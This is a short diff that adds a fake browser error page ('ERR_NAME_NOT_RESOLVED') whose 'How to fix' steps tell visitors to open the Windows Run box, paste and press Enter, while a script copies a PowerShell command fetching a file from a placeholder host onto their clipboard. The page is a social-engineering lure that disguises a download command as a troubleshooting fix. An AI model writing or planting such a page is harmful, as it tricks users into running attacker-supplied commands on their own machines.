@@ -1,0 +1,4 @@
+<h1>ERR_NAME_NOT_RESOLVED</h1><h2>How to fix</h2>
+1. Press Windows key + R  2. Press Ctrl + V  3. Enter
+copyToClipboard("powershell -c iwr http://example.invalid/f")
+
